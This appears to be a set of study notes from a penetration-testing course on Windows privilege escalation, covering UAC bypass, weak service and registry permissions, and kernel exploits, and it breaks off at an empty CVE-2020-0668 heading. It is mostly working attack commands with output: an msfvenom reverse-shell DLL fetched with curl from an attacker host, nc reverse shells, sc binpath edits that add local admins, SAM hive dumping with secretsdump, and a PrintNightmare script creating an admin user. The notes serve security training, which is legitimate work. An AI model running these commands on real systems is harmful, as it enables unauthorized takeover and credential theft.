## 1- User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities. Applications have different `integrity` levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.

When UAC is in place, a user can log into their system with their standard user account. When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user. Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

|Group Policy Setting|Registry Key|Default Setting|
|---|---|---|
|[User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)|FilterAdministratorToken|Disabled|
|[User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)|EnableUIADesktopToggle|Disabled|
|[User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)|ConsentPromptBehaviorAdmin|Prompt for consent for non-Windows binaries|
|[User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)|ConsentPromptBehaviorUser|Prompt for credentials on the secure desktop|
|[User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)|EnableInstallerDetection|Enabled (default for home) Disabled (default for enterprise)|
|[User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)|ValidateAdminCodeSignatures|Disabled|
|[User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)|EnableSecureUIAPaths|Enabled|
|[User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)|EnableLUA|Enabled|
|[User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)|PromptOnSecureDesktop|Enabled|
|[User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)|EnableVirtualization|Enabled|

[Source](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)
![[Pasted image 20260116121800.png]]
UAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier.

The `default RID 500 administrator` account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. In the example below, the user account `sarah` is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.
#### Checking Current User
```powershell
whoami /user  # winlpe-ws03\sarah

```
#### Confirming Admin Group Membership
```powershell
net localgroup administrators # Members : Administrator, sarah
```
#### Reviewing User Privileges
```powershell
 whoami /priv   # low priv
```
#### Confirming UAC is Enabled
```powershell
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
  # ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.
#### Checking Windows Version
UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.
```powershell
[environment]::OSVersion.Version
  # Major  Minor  Build  Revision
  # 10     0      14393  0
```
This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release `1607`.
![[Pasted image 20260116122158.png]]
The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary `SystemPropertiesAdvanced.exe`. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.

According to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.

When attempting to locate a DLL, Windows will use the following search order.

1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32` for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.
#### Reviewing Path Variable
Let's examine the path variable using the command `cmd /c echo %PATH%`. This reveals the default folders below. The `WindowsApps` folder is within the user's profile and writable by the user.
```powershell
cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```
We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.
#### Generating Malicious srrstr.dll DLL
First, let's generate a DLL to execute a reverse shell.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```
>the `SystemPropertiesAdvanced.exe` is `32 bit excitable` so we should use a `32 bit payload `
#### Starting Python HTTP Server on Attack Host
Copy the generated DLL to a folder and set up a Python mini webserver to host it.
```bash
sudo python3 -m http.server 8080
```
#### Downloading DLL Target
Download the malicious DLL to the target system, and stand up a `Netcat` listener on our attack machine.
```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```
#### Starting nc Listener on Attack Host
```bash
nc -lvnp 8443
```
#### Testing Connection
If we execute the malicious `srrstr.dll` file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using `rundll32.exe` to get a reverse shell connection.
```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
Once we get a connection back, we'll see normal user rights.
```bash
nc -lnvp 8443  # connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
whoami /priv # low priv 
```
#### Executing SystemPropertiesAdvanced.exe on Target Host
Before proceeding, we should ensure that any instances of the `rundll32` process from our previous execution have been terminated.
```powershell
tasklist /svc | findstr "rundll32"
  # rundll32.exe                  6300 N/A
  # rundll32.exe                  5360 N/A
  # rundll32.exe                  7044 N/A

taskkill /PID 7044 /F
  #  SUCCESS: The process with PID 7044 has been terminated.

taskkill /PID 6300 /F
  #  SUCCESS: The process with PID 6300 has been terminated.

taskkill /PID 5360 /F
  #  SUCCESS: The process with PID 5360 has been terminated.
```
Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.
```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
#### Receiving Connection Back
Checking back on our listener, we should receive a connection almost instantly.
```bash
nc -lvnp 8443
  # connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
whoami # winlpe-ws03\sarah  
whoami /priv # SeTakeOwnershipPrivilege .......... UAC bypass

```
This is successful, and we receive an elevated shell that shows our privileges are available and can be enabled if needed.


---
## 2- Weak Permissions
Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. As penetration testers, we need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available.
### Permissive File System ACLs

#### Running SharpUp
We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
```powershell
.\SharpUp.exe audit
 # === Modifiable Service Binaries ===
 #  Name             : SecurityService
 #  DisplayName      : PC Security Management Service
 #  State            : Stopped
 #  StartMode        : Auto
 #  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"  
```
The tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.
#### Checking Permissions with icacls
Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.
```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
#  BUILTIN\Users:(I)(F)
#  Everyone:(I)(F)            
```
#### Replacing Service Binary
This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.
```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

### Weak Service Permissions

#### Reviewing SharpUp Again
Let's check the `SharpUp` output again for any modifiable services. We see the `WindscribeService` is potentially misconfigured.
```powershell
SharpUp.exe audit
  # === Modifiable Services ===
  #  Name             : WindscribeService
  # State            : Running
  # StartMode        : Auto
  # PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```
#### Checking Permissions with AccessChk
Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.
```powershell
accesschk.exe /accepteula -quvcw WindscribeService
  # RW NT AUTHORITY\Authenticated Users
        # SERVICE_ALL_ACCESS
```
#### Check Local Admin Group
Checking the local administrators group confirms that our user `htb-student` is not a member.
```powershell
net localgroup administrators
# Members Administrator
```
#### Changing the Service Binary Path
We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).
```cmd-session
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
#### Stopping Service
Next, we must stop the service, so the new `binpath` command will run the next time it is started.
```cmd-session
sc stop WindscribeService
```
#### Starting the Service
Since we have full control over the service, we can start it again, and the command we placed in the `binpath` will run even though an error message is returned. The service fails to start because the `binpath` is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the `binpath`.
```cmd-session
sc start WindscribeService.
```
#### Confirming Local Admin Group Addition
Finally, check to confirm that our user was added to the local administrators group.
```powershell
net localgroup administrators
  # Members: Administrator , htb-student
```
Another notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful `NT AUTHORITY\SYSTEM` account. Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.
### Weak Service Permissions - Cleanup
We can clean up after ourselves and ensure that the service is working correctly by stopping it and resetting the binary path back to the original service executable.#### Reverting the Binary Path
```cmd
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```
#### Starting the Service Again
If all goes to plan, we can start the service again without an issue.
```cmd-session
sc start WindScribeService
```
#### Verifying Service is Running
Querying the service will show it running again as intended.
```powershell
sc query WindScribeService
        # STATE              : 4  Running
```


### Unquoted Service Path
When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.
#### Service Binary Path
```shell-session
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:
- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`
- #### Querying Service

```powershell
sc qc SystemExplorerHelpService
  # SERVICE_NAME: SystemExplorerHelpService
  # START_TYPE         : 2   AUTO_START
  # BINARY_PATH_NAME : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.
- `C:\Program.exe\`
- `C:\Program Files (x86)\System.exe`
However, creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges. Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable.
#### Searching for Unquoted Service Paths
We can identify unquoted service binary paths using the command below.
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
# GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
# System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
# WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
```
### Permissive Registry ACLs
It is also worth searching for weak service ACLs in the Windows Registry. We can do this using `accesschk`.
#### Checking for Weak Service ACLs in Registry
```powershell
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
  # RW HKLM\System\CurrentControlSet\services\ModelManagerService
        # KEY_ALL_ACCESS
```
#### Changing ImagePath with PowerShell
We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
### Modifiable Registry Autorun Binary
#### Check Startup Programs
We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```
This [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.


---

## 3-Kernel Exploits
It's a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal. Assuming a computer has been targeted for installation of updates, for example, using SCCM (Microsoft System Center Configuration Manager) or WSUS (Windows Server Update Services), there are still many reasons they could fail to install. Over the years, there have been many kernel exploits that affect the Windows operating system from Windows 2000/XP up to Windows 10/Server 2016/2019. Below can be found a detailed table of known remote code execution/local privilege escalation exploits for Windows operating systems, broken down by service pack level, from Windows XP onward to Server 2016.

|Base OS|XP||||2003|||Vista|||2008||7||2008R2||8|8.1|2012|2012R2|10|2016|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Service Pack|SP0|SP1|SP2|SP3|SP0|SP1|SP2|SP0|SP1|SP2|SP0|SP2|SP0|SP1|SP0|SP1|||||||
|MS03-026|•|•|•|•|•|•|•||||||||||||||||
|MS05-039|•|•|•||•|•|||||||||||||||||
|MS08-025|•|•|•||•|•|•|•|•||•||||||||||||
|MS08-067|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS08-068|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS09-012|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS09-050||||||||•|•|•|•|•|||||||||||
|MS10-015|||•|•|•|•|•|•|•|•|||||||||||||
|MS10-059||||||||•|•|•|•|•|•||•||||||||
|MS10-092||||||||•|•|•|•|•|•||•||||||||
|MS11-011||||•|•|•|•|•|•|•|•|•|•||•||||||||
|MS11-046||||•|•|•|•|•|•|•|•|•|•|•|•|•|||||||
|MS11-062||||•|•|•|•||||||||||||||||
|MS11-080||||•|•|•|•||||||||||||||||
|MS13-005||||||||•|•|•|•|•|•|•|•|•|•||•||||
|MS13-053||||•|•|•|•|•|•|•|•|•|•|•|•|•|•||•||||
|MS13-081|||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•||•||||
|MS14-002||||•|•|•|•||||||||||||||||
|MS14-040|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS14-058|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS14-062|||||•|•|•||||||||||||||||
|MS14-068|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS14-070|||||•|•|•||||||||||||||||
|MS15-001|||||||||||||•|•|•|•|•|•|•|•|||
|MS15-010|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-051|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-061|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-076|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-078||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-097||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|•||
|MS16-016||||||||•|•|•|•|•|•|•|•|•|||||||
|MS16-032||||||||•|•|•|•|•|•|•|•|•||•|•|•|||
|MS16-135||||||||•|•|•|•|•|•|•|•|•||•|•|•|•|•|
|MS17-010||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|
|CVE-2017-0213: COM Aggregate Marshaler|||||||||||||•|•|•|•|•|•|•|•|•|•|
|Hot Potato|||||||||||||•|•|•|•|•|•|•|•|•||
|SmashedPotato|||||||||||||•|•|•|•|•|•|•|•|•||

Note: This table is not 100% complete, and does not go past 2017. As of today, there are more known vulnerabilities for the newer operating system versions and even Server 2019.

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has 4,733 security vulnerabilities entered at the time of writing, showing the massive attack surface that a Windows environment presents.

As we can see from this table, there are many exploits that work for Windows XP up through Server 2012R2. As we get to Windows 10 and Server 2016, there are fewer known exploits. This is partly due to changes to the operating system over time, including security improvements and deprecation of older versions of protocols such as SMB. One important thing to note from this table is that when new vulnerabilities are discovered or exploits released (such as MS17-010), these usually trickle down and affect prior operating system versions. This is why it is vital to stay on top of patching or upgrading, retiring, or segregating off Windows systems that have reached end of life. We will explore this in more depth later on in this module.

It is important to note that while some of the examples above `are` remote code execution vulnerabilities, we can just as easily use them to escalate privileges. One example is if we gain access to a system and notice a port such as 445 (SMB service) not accessible from the outside, we may be able to privilege escalate if it is vulnerable to something such as EternalBlue (MS17-010). In this case, we could either port forward the port in question to be accessible from our attack host or run the exploit in question locally to escalate privileges.
### Notable Vulnerabilities
Over the years, there have been many high-impact Windows vulnerabilities that can be leveraged to escalate privileges, some being purely local privilege escalation vectors and others being remote code execution (RCE) flaws that can be used to escalate privileges by forwarding a local port. One example of the latter would be landing on a box that does not allow access to port 445 from the outside, performing port forward to access this port from our attack box, and leveraging a remote code execution flaw against the SMB service to escalate privileges. Below are some extremely high-impact Windows vulnerabilities over the years that can be leveraged to escalate privileges.

`MS08-067` - This was a remote code execution vulnerability in the "Server" service due to improper handling of RPC requests. This affected Windows Server 2000, 2003, and 2008 and Windows XP and Vista and allows an unauthenticated attacker to execute arbitrary code with SYSTEM privileges. Though typically encountered in client environments as a remote code execution vulnerability, we may land on a host where the SMB service is blocked via the firewall. We can use this to escalate privileges after forwarding port 445 back to our attack box. Though this is a "legacy" vulnerability, I still do see this pop up from time to time in large organizations, especially those in the medical industry who may be running specific applications that only work on older versions of Windows Server/Desktop. We should not discount older vulnerabilities even in 2021. We will run into every scenario under the sun while performing client assessments and must be ready to account for all possibilities. The box [Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html) on the Hack The Box platform showcases this vulnerability from the remote code execution standpoint. There are standalone as well as a Metasploit version of this exploit.

`MS17-010` - Also known as [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. As with MS08-067, this vulnerability can also be leveraged as a local privilege escalation vector if we land on a host where port 445 is firewalled off. There are various versions of this exploit for the Metasploit Framework as well as standalone exploit scripts. This attack was showcased in the [Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html) box on Hack The Box, again from the remote standpoint.

`ALPC Task Scheduler 0-Day` - The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to `.job` files located in the `C:\Windows\tasks` directory. An attacker could leverage this to create a hard link to a file that the attacker controls. The exploit for this flaw used the [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service. An in-depth writeup is available [here](https://web.archive.org/web/20250303161707/https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html). The Hack The Box box [Hackback](https://snowscan.io/htb-writeup-hackback/) can be used to try out this privilege escalation exploit.

Summer of 2021 revealed a treasure trove of new Windows and Active Directory-related remote code execution and local privilege escalation flaws to the delight of penetration testers (and real-world attackers), and I'm sure groans from our hard-working colleagues on the defense side of things.

`CVE-2021-36934 HiveNightmare, aka SeriousSam` is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as SecretsDump.py. More information about this flaw can be found [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) and [this](https://github.com/GossiTheDog/HiveNightmare/tree/master/Release) exploit binary can be used to create copies of the three files to our working directory. This [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) can be used to detect the flaw and also fix the ACL issue. Let's take a loo
#### HiveNightmare
##### Checking Permissions on the SAM File
We can check for this vulnerability using `icacls` to check permissions on the SAM file. In our case, we have a vulnerable version as the file is readable by the `BUILTIN\Users` group.
```powershell
icacls c:\Windows\System32\config\SAM 
  # BUILTIN\Users:(I)(RX)
```
Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have `System Protection` enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.
##### Performing Attack and Parsing Password Hashes
This [PoC](https://github.com/GossiTheDog/HiveNightmare) can be used to perform the attack, creating copies of the aforementioned registry hives:

```powershell
.\HiveNightmare.exe
  # Success: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07
  # Success: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07
  # Success: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07  
```
These copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:
```bash
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

#### PrintNightmare
`CVE-2021-1675/CVE-2021-34527 PrintNightmare` is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege `SeLoadDriverPrivilege` the ability to add drivers to a remote Print Spooler. This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely. The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system. `The flaw affects every supported version of Windows, and being that the Print Spooler runs by default on Domain Controllers, Windows 7 and 10`, and is often enabled on Windows servers, this presents a massive attack surface, hence "nightmare." Microsoft initially released a patch that did not fix the issue (and early guidance was to disable the Spooler service, which is not practical for many organizations) but released a second [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) in July of 2021 along with guidance to check that specific registry settings are either set to `0` or not defined. Once this vulnerability was made public, PoC exploits were released rather quickly. [This](https://github.com/cube0x0/CVE-2021-1675) version by [@cube0x0](https://twitter.com/cube0x0) can be used to execute a malicious DLL remotely or locally using a modified version of Impacket. The repo also contains a C# implementation. This [PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in
##### Checking for Spooler Service
We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a "path does not exist" error.
```powershell
ls \\localhost\pipe\spoolss
```
##### Adding Local Admin with PrintNightmare PowerShell PoC
First start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:
```powershell
Set-ExecutionPolicy Bypass -Scope Process   # [A] Yes to All
```
Now we can import the PowerShell script and use it to add a new local admin user.
```powershell
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
##### Confirming New Admin User
If all went to plan, we will have a new local admin user under our control. Adding a user is "noisy," We would not want to do this on an engagement where stealth is a consideration. Furthermore, we would want to check with our client to ensure account creation is in scope for the assessment.
```powershell
net user hacker  # Local Group Memberships      *Administrators       
```
This is a small sampling of some of the highest impact vulnerabilities. While it is imperative for us to understand and be able to enumerate and exploit these vulnerabilities, it is also important to be able to detect and leverage lesser-known flaws.
### lesser-known Vulnerabilities
#### Enumerating Missing Patches
The first step is looking at installed updates and attempting to find updates that may have been missed, thus, opening up an attack path for us.
##### Examining Installed Updates
We can examine the installed updates in several ways. Below are three separate commands we can use.
```powershell
systeminfo
wmic qfe list brief
Get-Hotfix
```
##### Viewing Installed Updates with WMI
```powershell
wmic qfe list brief
  # Update          KB4601056        NT AUTHORITY\SYSTEM  3/27/2021
```
We can search for each KB (Microsoft Knowledge Base ID number) in the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for `KB4601056` shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.
#### CVE-2020-0668 Example
